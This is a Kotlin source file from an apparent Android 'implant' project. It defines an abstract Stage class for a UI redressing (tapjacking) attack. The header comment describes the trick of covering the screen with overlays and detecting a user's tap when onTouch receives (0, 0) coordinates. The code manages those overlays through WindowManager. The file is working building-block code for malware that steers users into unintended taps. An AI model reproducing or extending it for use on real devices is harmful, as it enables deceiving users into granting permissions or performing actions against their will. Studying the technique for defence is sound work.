/*
* A Stage represents an overlay layout for a step of a UI Redressing Attack.
* Since Android passes (0, 0) to onTouch as the coordinates for MotionEvents outside of an overlay,
* we can infer that a user has clicked on the necessary area by covering the rest of the screen with
* overlays and recording when a MotionEvent with (0, 0) is passed to onTouch.
* Each Stage of an attack should inherit from this class.
* */
package com.cooperthecoder.implant

import android.content.Context
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager

abstract class Stage(val context: Context, val listener: () -> Unit): View.OnTouchListener {
    companion object {
        val TAG: String = javaClass.name
    }

    protected val windowManager: WindowManager by lazy {
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    abstract fun drawOnScreen()
    abstract fun clearFromScreen()

    override fun onTouch(v: View, event: MotionEvent): Boolean {
        val x = event.x
        val y = event.y
        Log.d(TAG, "Touch coordinates: ($x, $y)")
        if (x == 0.0F && y == 0.0F) {
            listener()
        }
        return false
    }

    protected fun addOverlay(overlay: View, params: WindowManager.LayoutParams) {
        if (overlay.windowToken == null) {
            overlay.setOnTouchListener(this)
            Log.d(TAG, "Adding overlay to WindowManager")
            try {
                windowManager.addView(overlay, params)
                Log.d(TAG, "Overlay added to WindowManager")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        Log.d(TAG, "Overlay already attached to WindowManager")
    }

    protected fun removeOverlay(overlay: View?) {
        if (overlay?.windowToken != null) {
            windowManager.removeView(overlay)
        }
    }
}